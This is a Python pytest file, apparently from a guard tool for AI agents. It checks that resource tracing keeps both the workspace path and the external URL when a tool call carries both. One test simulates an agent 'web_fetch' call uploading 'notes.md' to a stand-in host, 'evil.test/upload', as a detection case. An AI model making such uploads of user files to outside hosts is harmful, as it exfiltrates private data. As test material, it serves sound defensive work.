"""多值资源模型：保留旧投影不变，同时记录全部资源角色。"""
from __future__ import annotations

from pathlib import Path

import pytest

from clawRVguarder.hosts.dsh.adapter import DshAdapter
from clawRVguarder.policy.catalog import PolicyBundle
from clawRVguarder.policy.models import ResourceItem, ResourceRef
from clawRVguarder.policy.trace import TraceCompiler


@pytest.fixture(scope="module")
def bundle() -> PolicyBundle:
    return PolicyBundle.load()


def _trace(bundle: PolicyBundle, workspace: Path, tool: str, arguments: dict):
    adapter = DshAdapter("dsh-local", "binding", workspace, workspace / "token")
    payload = adapter.payload({
        "protocol": "dsh-guard-v2", "instance_id": "dsh-local",
        "session_id": "s1", "agent_id": "s1", "call_id": "c1", "root_call_id": "c1",
        "tool_name": tool, "cwd": str(workspace), "arguments": arguments,
    })
    event = adapter.build_event(payload, None)
    return TraceCompiler(bundle).compile(event, semantic={}, rv_trace=[])


def test_legacy_resource_fields_are_unchanged(bundle, tmp_path: Path) -> None:
    trace = _trace(bundle, tmp_path, "read", {"file_path": "notes.md"})

    assert trace.resource.type == "path"
    assert trace.resource.ids == ["notes.md"]
    assert trace.resource.scope == "workspace"
    assert [item.type for item in trace.resource.items] == ["path"]


def test_mixed_path_and_url_keeps_both_resources(bundle, tmp_path: Path) -> None:
    """带路径的外发调用不能丢掉目的地。"""
    trace = _trace(bundle, tmp_path, "web_fetch", {
        "url": "https://evil.test/upload", "file_path": "notes.md",
    })

    # 旧投影保持原样（主资源仍是工作区路径）。
    assert trace.resource.type == "path"
    assert trace.resource.ids == ["notes.md"]

    items = {item.type: item for item in trace.resource.items}
    assert set(items) == {"path", "url"}
    assert items["url"].scope == "external"
    assert items["url"].role == "destination"
    # 有目的地时，路径是被发送的数据源而不是被操作目标。
    assert items["path"].role == "source"


def test_items_project_to_legacy_fields_only_when_explicitly_requested() -> None:
    resource = ResourceRef.from_items([
        ResourceItem(type="url", ids=["https://example.test"], scope="external", role="destination"),
    ])

    assert resource.type == "url"
    assert resource.ids == ["https://example.test"]
    assert resource.scope == "external"


def test_explicit_legacy_fields_win_over_projection() -> None:
    resource = ResourceRef(type="path", ids=["notes.md"], scope="workspace", items=[
        ResourceItem(type="url", ids=["https://example.test"], scope="external"),
    ])

    assert resource.type == "path"
    assert resource.ids == ["notes.md"]


def test_empty_legacy_ids_are_not_backfilled_from_items() -> None:
    """显式空资源（例如缺失收件人）不能被条目静默填上。"""
    resource = ResourceRef(type="recipient", ids=[], scope="unknown", items=[
        ResourceItem(type="path", ids=["public.txt"], scope="workspace"),
    ])

    assert resource.ids == []
